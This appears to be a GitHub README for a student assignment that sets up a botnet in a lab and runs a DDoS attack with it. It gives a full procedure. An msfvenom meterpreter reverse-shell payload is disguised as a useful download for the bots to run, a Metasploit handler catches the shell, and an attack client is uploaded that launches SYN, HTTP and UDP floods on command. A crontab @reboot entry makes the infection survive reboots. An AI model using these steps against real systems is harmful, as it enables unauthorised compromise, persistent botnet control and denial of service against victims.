# DDoS-Attack-using-Botnets
Developed BotNet Scenario using single BotMaster and two Bots that gets involved in DDoS attack

Implementation of a Distributed Denial of Service (DDoS) Attack using Kali Linux as Master and two Ubuntu machines as 2 bots and Windows XP as Victim

To perform the attack, the steps are to be followed

1. Setup a Kali Linux Machine in local area network. Here it is 172.16.28.4
2. Create a venom file using msfvenom using the command and start apache server
    > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP of the machine] LPORT=[Port for connection] -f elf -o [payload].bin
3. Setup metasploit to reviece the reverse tcp connection using the following commands
	> msfconsole
	
	> use exploit/multi/handler
	
	> set payload linux/x86/meterpreter/reverse_tcp
	
	> set lhost [IP of the machine]
	
	> set lport [Port for connection]

	> show options
	
	> exploit
	
4. Wait for a connection
5. Setup Ubuntu machine and then configure them in the local area network. Here it is 172.16.28.6 and 172.16.28.8
6. So here when bot downloads some other application along with the venom file we created will be installed. Thinking this as a useful file bot machine might execute the file which gives shell access to the master  thus creating a connection
7. After getting a connection, check the details of the machine using 
	> getuid    
	  // This returns username and computer name.
    
	> pwd  
	  // To know the path of the client to check for existing directory
8. Upload the attack script to the system
	> upload [file path which has to be uploaded(tcp_client.py)] [directory of the client to which to be uploaded]  
9. After having enough bots, run the server program for the attack
	> python3 tcp_server.py
10. In metasploit, run the shell commands to run the client program
	> shell

	> python3 tcp_client.py
11. Same above methodology is followed for all other bots.
12. Send commands to the bots for the attack
	> SEND [Type of Attack] [Victim IP] [Count]
	Type of attack -> TCP-SYN / HTTP / UDP
13. Stop the attack when ever necessary using stop command
	> stop
14. Open wireshark in victim machine to capture these packets
15. Presently it is not persistent connection so once connection is lost again the bot has to download the file and execute. So to make it persistent we need to keep it in startup folder so everytime system boots this code is executed.
	  > sudo cp -i /path/to/yourscirpt.py /bin
	  
    > sudo crontab -e
	  
      // Scroll down to bottom and add the below line
	  
    > @reboot python3 /bin/your_script.py &
	  
      // Note that & at the end means that the command runs in background and so it doesn't stop booting process
    
16. Now finally the connection is made persistent. That's it for this assignment.
